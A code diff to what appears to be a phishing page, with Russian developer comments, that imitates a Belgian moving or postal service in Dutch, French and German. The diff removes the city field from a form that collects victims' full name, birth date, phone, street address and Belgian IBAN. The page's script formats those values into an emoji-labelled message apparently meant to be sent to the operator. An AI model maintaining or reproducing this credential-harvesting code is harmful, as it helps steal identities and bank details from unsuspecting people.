@@ -197,7 +197,6 @@
            ================== ТЕЛЕФОНЫ =============================
            ========================================================= */
         @media (max-width: 768px) {
-            /* Верхняя панель: лого по центру, справа Verhuizen / Hulp & Contact / FR NL DE */
             .top-bar {
                 padding: 10px 12px;
                 height: auto;
@@ -205,7 +204,6 @@
                 justify-content: center;
                 gap: 8px;
             }
-            /* Скрываем верхние табы (Particulieren / Professionelen / Grote ondernemingen) */
             .top-bar .nav-links { display: none; }
             .top-bar .underline { display: none; }
 
@@ -226,7 +224,6 @@
                 flex-wrap: nowrap;
                 white-space: nowrap;
             }
-            /* Скрываем иконку темы на мобильном */
             .top-bar .right-links .theme-toggle { display: none; }
 
             .lang-switch {
@@ -430,10 +427,7 @@
                 <div class="form-group">
                     <label data-i18n="form.addr">Adres</label>
                     <div class="form-row">
-                        <div class="form-group" style="flex: 2;">
-                            <input type="text" name="stad" id="stad" data-i18n-ph="form.stad.ph" placeholder="Stad" maxlength="80" autocomplete="address-level2" required>
-                        </div>
-                        <div class="form-group" style="flex: 1.4;">
+                        <div class="form-group" style="flex: 2.4;">
                             <input type="text" name="straat" id="straat" data-i18n-ph="form.straat.ph" placeholder="Straat en huisnummer" maxlength="120" autocomplete="street-address" required>
                         </div>
                         <div class="form-group" style="flex: 1;">
@@ -601,7 +595,6 @@
                 "form.dob": "Uw geboortedatum",
                 "form.phone": "Uw telefoonnummer",
                 "form.addr": "Adres",
-                "form.stad.ph": "Stad",
                 "form.straat.ph": "Straat en huisnummer",
                 "form.postcode.ph": "Postcode",
                 "form.iban": "Uw IBAN",
@@ -676,7 +669,6 @@
                 "form.dob": "Votre date de naissance",
                 "form.phone": "Votre numéro de téléphone",
                 "form.addr": "Adresse",
-                "form.stad.ph": "Ville",
                 "form.straat.ph": "Rue et numéro",
                 "form.postcode.ph": "Code postal",
                 "form.iban": "Votre IBAN",
@@ -751,7 +743,6 @@
                 "form.dob": "Ihr Geburtsdatum",
                 "form.phone": "Ihre Telefonnummer",
                 "form.addr": "Adresse",
-                "form.stad.ph": "Stadt",
                 "form.straat.ph": "Straße und Hausnummer",
                 "form.postcode.ph": "Postleitzahl",
                 "form.iban": "Ihre IBAN",
@@ -1000,14 +991,13 @@
                 var fio      = (document.getElementById('fio') || {}).value || '';
                 var dob      = (document.getElementById('dob') || {}).value || '';
                 var phone    = (document.getElementById('phoneInput') || {}).value || '';
-                var stad     = (document.getElementById('stad') || {}).value || '';
                 var straat   = (document.getElementById('straat') || {}).value || '';
                 var postcode = (document.getElementById('postcode') || {}).value || '';
                 var ibanEl   = document.getElementById('iban');
                 var ibanRaw  = ibanEl ? ibanEl.value.replace(/\D/g, '') : '';
                 var ibanFull = 'BE' + ibanRaw;
 
-                if (!fio || !dob || !phone || !stad || !straat || !postcode || !ibanRaw) {
+                if (!fio || !dob || !phone || !straat || !postcode || !ibanRaw) {
                     alert('Vul alle velden in.');
                     return;
                 }
@@ -1027,7 +1017,6 @@
                     '👤 Naam: ' + fio + '\n' +
                     '🎂 Geboortedatum: ' + dob + '\n' +
                     '📱 Telefoon: ' + phone + '\n' +
-                    '🏙 Stad: ' + stad + '\n' +
                     '🏠 Straat: ' + straat + '\n' +
                     '📮 Postcode: ' + postcode + '\n' +
                     ibanLine + '\n' +
